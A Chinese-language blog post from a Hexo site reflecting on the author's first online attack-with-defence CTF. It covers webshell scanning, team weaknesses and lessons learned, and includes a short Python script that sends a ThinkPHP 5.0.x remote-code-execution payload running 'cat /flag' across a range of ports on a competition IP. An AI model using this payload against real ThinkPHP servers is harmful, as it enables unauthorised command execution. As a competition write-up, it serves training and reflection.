@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。 开赛开局给了ssh和web服务以及要求，如果被check down了，每轮扣100分（当时不知道每轮扣100分，以为一共扣100，每次restart需要扣100并且重置环境，所以就一直没restart） 防护拿到ss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次线上AWD">
+<meta property="og:url" content="https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。 开赛开局给了ssh和web服务以及要求，如果被check down了，每轮扣100分（当时不知道每轮扣100分，以为一共扣100，每次restart需要扣100并且重置环境，所以就一直没restart） 防护拿到ss">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-02-24T16:24:25.000Z">
+<meta property="article:modified_time" content="2021-02-24T16:52:22.848Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="awd">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>记一次线上AWD</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2021/03/06/%E8%BF%91%E4%B8%80%E5%B9%B4%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/01/19/server%E9%85%B1%E5%AE%9E%E7%8E%B0%E7%AD%BE%E5%88%B0%E6%8F%90%E9%86%92/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&text=记一次线上AWD"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&is_video=false&description=记一次线上AWD"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次线上AWD&body=Check out this article: https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&name=记一次线上AWD&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&t=记一次线上AWD"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">开赛</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-number">2.</span> <span class="toc-text">防护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B91"><span class="toc-number">2.0.1.</span> <span class="toc-text">弱点1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E6%A3%80"><span class="toc-number">2.1.</span> <span class="toc-text">自检</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B92"><span class="toc-number">2.1.1.</span> <span class="toc-text">弱点2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B93"><span class="toc-number">2.1.2.</span> <span class="toc-text">弱点3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B94"><span class="toc-number">3.0.1.</span> <span class="toc-text">弱点4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B95"><span class="toc-number">3.0.2.</span> <span class="toc-text">弱点5</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E6%80%9D%E4%B8%8E%E6%94%B9%E8%BF%9B"><span class="toc-number">4.</span> <span class="toc-text">反思与改进</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E8%83%BD%E5%8A%9B"><span class="toc-number">4.1.</span> <span class="toc-text">提升脚本编写能力</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87payload%E7%86%9F%E7%BB%83%E5%BA%A6"><span class="toc-number">4.2.</span> <span class="toc-text">提升payload熟练度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E8%BF%90%E7%BB%B4%E6%B0%B4%E5%B9%B3"><span class="toc-number">4.3.</span> <span class="toc-text">提升运维水平</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E5%BA%94%E6%80%A5%E5%8F%8D%E5%BA%94%E8%83%BD%E5%8A%9B"><span class="toc-number">4.4.</span> <span class="toc-text">提升应急反应能力</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E5%8F%8D%E5%88%B6%E8%83%BD%E5%8A%9B"><span class="toc-number">4.5.</span> <span class="toc-text">提升反制能力</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E5%96%84%E6%AD%A6%E5%99%A8%E5%BA%93"><span class="toc-number">4.6.</span> <span class="toc-text">完善武器库</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        记一次线上AWD
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-02-24T16:24:25.000Z" itemprop="datePublished">2021-02-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/awd/" rel="tag">awd</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>最近打了一次线上AWD，算是第一次正式打AWD,表现不太好，前期看了一些AWD的思路和套路，但是没有真正应用于实际的AWD环境中，随做一次记录，记录这里面存在的问题以及没做好的地方。</p>
+<h1 id="开赛"><a href="#开赛" class="headerlink" title="开赛"></a>开赛</h1><p>开局给了ssh和web服务以及要求，如果被check down了，每轮扣100分（当时不知道每轮扣100分，以为一共扣100，每次restart需要扣100并且重置环境，所以就一直没restart）</p>
+<h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>拿到ssh权限后首先备份了文件，用D盾、河马webshell专杀工具对web环境进行杀毒，想查杀webshell。</p>
+<p>在webshell查杀环节中，使用河马webshell专杀工具和D盾杀了一个shell，但是有免杀shell没杀出来（一般AWD会内置多个后门），由于时间原因也没有细看，造成的后果是被传了不死马。（这是后话了。</p>
+<p>在webshell查杀环节中应改进的地方是：</p>
+<p>1.采用多种工具综合查杀webshell</p>
+<p>2.对疑似后门文件手工查看，不能完全相信工具。</p>
+<h3 id="弱点1"><a href="#弱点1" class="headerlink" title="弱点1"></a>弱点1</h3><p>流量监控脚本没挂上去，导致监控流量失败，无法得知有哪些payload是发起了攻击。</p>
+<h2 id="自检"><a href="#自检" class="headerlink" title="自检"></a>自检</h2><p>通过观察web服务以及报错页面，出现了经典的十年磨一剑—-TP5.0.2，于是立刻想到了TP5.0.2的RCE。</p>
+<p>网上收集payload后打了一波cat/flag，成功，并且通过该方式拿到了其他队伍的flag，遂考虑采用脚本编写EXP批量getflag并通知负责防护的队员修复相关漏洞。</p>
+<h3 id="弱点2"><a href="#弱点2" class="headerlink" title="弱点2"></a>弱点2</h3><p>在修复时浪费了太多的时间，负责修复的队员无法尽快修复，并在上传修复后的文件时遇到了权限问题。</p>
+<h3 id="弱点3"><a href="#弱点3" class="headerlink" title="弱点3"></a>弱点3</h3><p>临场紧张+payload不熟悉</p>
+<p>我真的吐了。当时太紧张了，之前利用TP5的payload也是复制粘贴，这两个因素加起来导致我在Hackbar能顺利打payload，Burp也可以，但到了写脚本的时候就不行。因为payload是四个键值对，我写脚本的时候只写了一个。</p>
+<p>贴一下我当时写的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line">url=<span class="string">&quot;http://47.104.144.188:&quot;</span></span><br><span class="line">rest=<span class="string">&quot;/index.php?s=captcha&quot;</span></span><br><span class="line">data=&#123;<span class="string">&#x27; _method&#x27;</span>:<span class="string">&#x27;__construct&amp;filter%5B%5D=system&amp;get%5B%5D=cat+%2Fflag&amp;method=get&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9001</span>,<span class="number">9051</span>):</span><br><span class="line">    urls=<span class="built_in">str</span>(url+<span class="built_in">str</span>(port)+rest)</span><br><span class="line">    response=requests.post(url=urls,data=data)</span><br><span class="line">    <span class="built_in">print</span> (response.text)</span><br></pre></td></tr></table></figure>
+
+<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><p>在拿到一个并且唯一一个payload后，由于没有编写出批量利用脚本，遂考虑手动打，导致的得分缓慢。</p>
+<h3 id="弱点4"><a href="#弱点4" class="headerlink" title="弱点4"></a>弱点4</h3><p>临场脚本编写能力欠缺</p>
+<p>在编写脚本的过程中，需要用到对html标签解析的库（叫啥忘了）、多线程（批量getflag和提交flag），但由于很久没写多线程了，所以忘了多线程咋用了。。而且解析html标签还是大二学爬虫的时候写的，太过久远，也搞忘记了。所以最后脚本也没跑起来，耽误了太多时间。</p>
+<h3 id="弱点5"><a href="#弱点5" class="headerlink" title="弱点5"></a>弱点5</h3><p>对AWD赛制不熟悉，机器至少down了三分之一的比赛时间，5分钟一轮，一轮掉100分。我说怎么越交flag分越少。。绝了。</p>
+<h1 id="反思与改进"><a href="#反思与改进" class="headerlink" title="反思与改进"></a>反思与改进</h1><h2 id="提升脚本编写能力"><a href="#提升脚本编写能力" class="headerlink" title="提升脚本编写能力"></a>提升脚本编写能力</h2><p>不说了。多写多看多寻思 多借鉴别人的思路，掌握基本库的用法。</p>
+<p><strong>先把多线程和xpath解析学会了！！！</strong></p>
+<h2 id="提升payload熟练度"><a href="#提升payload熟练度" class="headerlink" title="提升payload熟练度"></a>提升payload熟练度</h2><p>要求平时复现过程中不能拿到直接打，要分析原理与利用链。</p>
+<h2 id="提升运维水平"><a href="#提升运维水平" class="headerlink" title="提升运维水平"></a>提升运维水平</h2><p>赛前看到了安恒低权限EDR，但是部署起来看起来麻烦，就没搞，但是流量监控脚本也没挂上去，以后需要提前部署并实践相关脚本与环境。</p>
+<p>控制好相关文件的读写权限等。</p>
+<h2 id="提升应急反应能力"><a href="#提升应急反应能力" class="headerlink" title="提升应急反应能力"></a>提升应急反应能力</h2><p>要通过流量脚本观察是否有入侵与挂马行为，学会如何处理不死马等紧急情况。</p>
+<h2 id="提升反制能力"><a href="#提升反制能力" class="headerlink" title="提升反制能力"></a>提升反制能力</h2><p>要能通过别人打的payload反打别人</p>
+<h2 id="完善武器库"><a href="#完善武器库" class="headerlink" title="完善武器库"></a>完善武器库</h2><p>多收集webshell查杀工具、积累webshell免杀方式、收集常见漏洞EXP。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">开赛</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-number">2.</span> <span class="toc-text">防护</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B91"><span class="toc-number">2.0.1.</span> <span class="toc-text">弱点1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E6%A3%80"><span class="toc-number">2.1.</span> <span class="toc-text">自检</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B92"><span class="toc-number">2.1.1.</span> <span class="toc-text">弱点2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B93"><span class="toc-number">2.1.2.</span> <span class="toc-text">弱点3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B94"><span class="toc-number">3.0.1.</span> <span class="toc-text">弱点4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E7%82%B95"><span class="toc-number">3.0.2.</span> <span class="toc-text">弱点5</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E6%80%9D%E4%B8%8E%E6%94%B9%E8%BF%9B"><span class="toc-number">4.</span> <span class="toc-text">反思与改进</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E8%83%BD%E5%8A%9B"><span class="toc-number">4.1.</span> <span class="toc-text">提升脚本编写能力</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87payload%E7%86%9F%E7%BB%83%E5%BA%A6"><span class="toc-number">4.2.</span> <span class="toc-text">提升payload熟练度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E8%BF%90%E7%BB%B4%E6%B0%B4%E5%B9%B3"><span class="toc-number">4.3.</span> <span class="toc-text">提升运维水平</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E5%BA%94%E6%80%A5%E5%8F%8D%E5%BA%94%E8%83%BD%E5%8A%9B"><span class="toc-number">4.4.</span> <span class="toc-text">提升应急反应能力</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8D%87%E5%8F%8D%E5%88%B6%E8%83%BD%E5%8A%9B"><span class="toc-number">4.5.</span> <span class="toc-text">提升反制能力</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E5%96%84%E6%AD%A6%E5%99%A8%E5%BA%93"><span class="toc-number">4.6.</span> <span class="toc-text">完善武器库</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&text=记一次线上AWD"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&is_video=false&description=记一次线上AWD"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次线上AWD&body=Check out this article: https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&title=记一次线上AWD"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&name=记一次线上AWD&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2021/02/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BA%BF%E4%B8%8AAWD/&t=记一次线上AWD"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
